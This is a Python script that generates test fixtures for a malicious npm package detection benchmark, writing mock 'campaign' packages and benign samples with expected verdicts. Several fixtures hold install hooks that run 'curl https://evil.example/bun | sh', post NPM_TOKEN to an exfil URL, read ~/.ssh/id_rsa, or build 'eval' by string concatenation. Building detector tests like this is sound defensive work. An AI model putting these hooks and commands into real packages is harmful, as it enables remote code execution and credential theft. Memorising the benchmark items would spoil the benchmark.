#!/usr/bin/env python3
"""Generate Tier H campaign reconstructions + Tier I NPMBench-style fixtures."""

from __future__ import annotations

import json
import shutil
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
INCIDENTS = ROOT / "benchmarks" / "incidents"
MOCK = ROOT / "fixtures" / "MOCK_"


def _write(pkg: Path, files: dict, expected: dict) -> None:
    pkg.mkdir(parents=True, exist_ok=True)
    for name, content in files.items():
        fp = pkg / name
        fp.parent.mkdir(parents=True, exist_ok=True)
        fp.write_text(content, encoding="utf-8")
    (pkg / "expected.json").write_text(json.dumps(expected, indent=2), encoding="utf-8")


def gen_tier_h() -> list[dict]:
    cases = []
    campaigns = [
        ("INC-H01", "chaindrop-bun-stager", {
            "package.json": json.dumps({"name": "chaindrop-stager", "version": "1.0.0", "scripts": {"postinstall": "node stager.js"}}),
            "stager.js": """const fs = require('fs');
const cp = require('child_process');
const cfg = require('./config');
if (process.env.CI !== 'true') {
  cp.exec(cfg.cmd);
}
""",
            "config.js": "module.exports = { cmd: 'curl https://evil.example/bun | sh' };\n",
        }),
        ("INC-H02", "ottercookie-wrapper", {
            "package.json": json.dumps({"name": "lodash-utils-safe", "version": "1.0.0", "dependencies": {"payload-pkg": "1.0.0"}}),
            "index.js": "require('./packages/payload-pkg');\n",
            "packages/payload-pkg/package.json": json.dumps({"name": "payload-pkg", "main": "loader.js"}),
            "packages/payload-pkg/loader.js": """const cp = require('child_process');
const s = require('./stealer');
cp.exec(s.cmd);
""",
            "packages/payload-pkg/stealer.js": "module.exports = { cmd: process.env.SSH_KEY || 'cat ~/.ssh/id_rsa' };\n",
        }),
        ("INC-H03", "shai-hulud-token", {
            "package.json": json.dumps({"name": "shai-token-worm", "version": "9.9.9", "scripts": {"prepare": "node worm.js"}}),
            "worm.js": """const fs = require('fs');
const cp = require('child_process');
const token = require('./token');
cp.exec('curl -X POST https://evil.example/exfil -d ' + token.value);
""",
            "token.js": "module.exports = { value: process.env.NPM_TOKEN || 'x' };\n",
        }),
        ("INC-H04", "ironworm-obf", {
            "package.json": json.dumps({"name": "ironworm-sample", "main": "index.js"}),
            "index.js": "require('./lib/run');\n",
            "lib/run.js": "const a='ev';const b='al';const c=a+b;require('child_process').exec(c);\n",
        }),
        ("INC-H05", "dep-confusion-2026", {
            "package.json": json.dumps({"name": "@corp/internal-lib", "scripts": {"postinstall": "node install.js"}}),
            "install.js": "require('./stager').run();\n",
            "stager.js": "const cp=require('child_process');module.exports={run:()=>cp.exec('whoami')};\n",
        }),
    ]
    for inc_id, name, files in campaigns:
        _write(INCIDENTS / inc_id, files, {"verdict": "DETECT", "require_cross_file": True, "category": "campaign", "tier": "H"})
        cases.append({"id": inc_id, "tier": "H", "path": f"benchmarks/incidents/{inc_id}", "verdict": "DETECT"})

    # H06-H10 from known-good MOCK detect samples
    good_mocks = ["M01_shard_three_modules", "M02_postinstall_chain", "M03_async_setimmediate", "M05_string_concat_eval", "M07_variant_01"]
    for i, mock_name in enumerate(good_mocks, start=6):
        mock = MOCK / mock_name
        if not mock.is_dir():
            continue
        inc_id = f"INC-H{i:02d}"
        dest = INCIDENTS / inc_id
        if dest.exists():
            shutil.rmtree(dest)
        shutil.copytree(mock, dest)
        (dest / "expected.json").write_text(
            json.dumps({"verdict": "DETECT", "require_cross_file": True, "category": "campaign", "tier": "H"}),
            encoding="utf-8",
        )
        cases.append({"id": inc_id, "tier": "H", "path": f"benchmarks/incidents/{inc_id}", "verdict": "DETECT"})
    return cases


def gen_tier_i() -> list[dict]:
    """Tier I: stratified benign/malicious sample (NPMBench-style scale)."""
    cases = []
    tier_i = ROOT / "benchmarks" / "tier_i"
    tier_i.mkdir(parents=True, exist_ok=True)

    # 50 malicious from MOCK detect
    mocks_mal = sorted([d for d in MOCK.iterdir() if d.is_dir() and json.loads((d / "expected.json").read_text()).get("verdict") == "DETECT"])
    for i, mock in enumerate(mocks_mal[:50], start=1):
        inc_id = f"INC-I-M{i:03d}"
        dest = tier_i / inc_id
        if dest.exists():
            shutil.rmtree(dest)
        shutil.copytree(mock, dest)
        (dest / "expected.json").write_text(json.dumps({"verdict": "DETECT", "category": "npmbench_mal", "tier": "I"}), encoding="utf-8")
        cases.append({"id": inc_id, "tier": "I", "path": f"benchmarks/tier_i/{inc_id}", "verdict": "DETECT"})

    # 50 benign
    mocks_clean = sorted([d for d in MOCK.iterdir() if d.is_dir() and json.loads((d / "expected.json").read_text()).get("verdict") == "CLEAN"])
    for i in range(1, 51):
        if mocks_clean and i <= len(mocks_clean):
            mock = mocks_clean[(i - 1) % len(mocks_clean)]
            inc_id = f"INC-I-B{i:03d}"
            dest = tier_i / inc_id
            if dest.exists():
                shutil.rmtree(dest)
            shutil.copytree(mock, dest)
        else:
            inc_id = f"INC-I-B{i:03d}"
            dest = tier_i / inc_id
            _write(
                dest,
                {
                    "package.json": json.dumps({"name": f"benign-npmbench-{i}", "version": "1.0.0"}),
                    "index.js": f"module.exports = {{ n: {i} }};\n",
                },
                {"verdict": "CLEAN", "category": "npmbench_benign", "tier": "I"},
            )
        cases.append({"id": inc_id, "tier": "I", "path": f"benchmarks/tier_i/{inc_id}", "verdict": "CLEAN"})
    return cases


def main() -> None:
    manifest_path = INCIDENTS / "manifest.json"
    data = json.loads(manifest_path.read_text(encoding="utf-8")) if manifest_path.is_file() else {"version": 4, "cases": []}
    # Remove old H/I
    data["cases"] = [c for c in data["cases"] if c.get("tier") not in ("H", "I")]
    h_cases = gen_tier_h()
    i_cases = gen_tier_i()
    data["cases"].extend(h_cases)
    data["cases"].extend(i_cases)
    data["tier_counts"] = {"H": len(h_cases), "I": len(i_cases)}
    manifest_path.write_text(json.dumps(data, indent=2), encoding="utf-8")

    # Update INC-C02 for gyp detection — move to tier B in manifest
    for case in data["cases"]:
        if case["id"] == "INC-C02":
            case["tier"] = "B"
            case["verdict"] = "DETECT"
    c02 = INCIDENTS / "INC-C02"
    if (c02 / "expected.json").is_file():
        exp = json.loads((c02 / "expected.json").read_text(encoding="utf-8"))
        exp["verdict"] = "DETECT"
        exp["allowed_statuses"] = ["DETECT", "SUSPICIOUS"]
        exp["note"] = "gyp_scan should detect binding.gyp shell action"
        (c02 / "expected.json").write_text(json.dumps(exp, indent=2), encoding="utf-8")

    print(json.dumps({"tier_h": len(h_cases), "tier_i": len(i_cases)}))


if __name__ == "__main__":
    main()
